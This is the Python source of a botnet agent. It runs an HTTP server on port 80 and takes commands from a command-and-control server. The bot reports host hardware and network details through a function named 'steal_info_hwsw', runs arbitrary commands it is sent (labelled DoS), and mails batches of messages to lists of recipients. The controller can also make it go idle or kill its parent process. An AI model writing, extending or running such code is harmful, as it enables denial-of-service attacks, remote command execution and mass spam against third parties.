#!/usr/bin/env python

from http.server import BaseHTTPRequestHandler, HTTPServer
from functools import partial

import sys
import json
import subprocess
import os, signal
from .send_email import send_email

def get_my_ip():
    cmd = ['hostname', '-I']
    my_ip = exec_cmd(cmd)
    return my_ip[:-2]

CURRENT_PROCESSES = []

def exec_cmd(cmd, wait=False):
    if wait:
        proc = subprocess.Popen(cmd, shell=False, stdin=None, stdout=None, stderr=None,close_fds=True)
        CURRENT_PROCESSES.append(proc)
        return 1
    proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    o, e = proc.communicate()
    result = o.decode('ascii')
    return result

def steal_info_hwsw():
    return {
        "uname": exec_cmd(["uname", "-a"]).split('\n'),
        "lscpu": exec_cmd(["lscpu"]).split('\n'),
        "network": exec_cmd(["netstat", "-i"]).split('\n')
    }

def make_handler(ppid):
    class my_HTTPServer_RequestHandler(BaseHTTPRequestHandler):
        
        # Note: uncomment the following two lines to enable server logging
        def log_message(self, format, *args):
            return

        def _set_headers(self):
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()

        def do_GET(self):
            self._set_headers()
            if self.path.endswith("hwsw"):
                infos = steal_info_hwsw()
                self.wfile.write(json.dumps(infos, indent=2).encode('utf-8'))
                return
            message = "I'm active"
            self.wfile.write(bytes(message, "utf8"))
            return

        def do_POST(self):
            length = int(self.headers.get('content-length'))
            payload_string = self.rfile.read(length).decode('utf-8')
            payload = json.loads(payload_string) if payload_string else None
            # PARSE and execute payload
            if payload["action"] == 'dos':
                print("[+] Executing dos as C&C asked")
                exec_cmd(payload["content"].split(), wait=True)
                self._set_headers()
                self.wfile.write("POST request for {}".format(self.path).encode('utf-8'))
                return 1
            elif payload["action"] == "email_batch":
                content = json.loads(payload["content"])
                for receiver in content["receivers"]:
                    send_email(receiver, content["subject"], content["plaintext"], content["html"])
                    self._set_headers()
                self.wfile.write("POST request for {}".format(self.path).encode('utf-8'))
                
            elif payload["action"] == "kill":
                self._set_headers()
                self.wfile.write("POST request for {}".format(self.path).encode('utf-8'))
                os.kill(ppid, signal.SIGTERM)
                return 1
            elif payload["action"] == 'exit':
                self._set_headers()
                self.wfile.write("POST request for {}".format(self.path).encode('utf-8'))
                return 1
            elif payload["action"] == 'idle':
                print("[+] Making bot idle")
                [proc.kill() for proc in CURRENT_PROCESSES]                
                self._set_headers()
                self.wfile.write("POST request for {}".format(self.path).encode('utf-8'))
                return 1

            self._set_headers()
            self.wfile.write("POST request for {}".format(self.path).encode('utf-8'))

    return my_HTTPServer_RequestHandler


def run_http(ppid):
    server_address = (get_my_ip(), 80)
    #handler = partial(my_HTTPServer_RequestHandler, ppid)
    httpd = HTTPServer(server_address, make_handler(ppid))
    print(f"-- http listening {server_address} --")
    httpd.serve_forever()
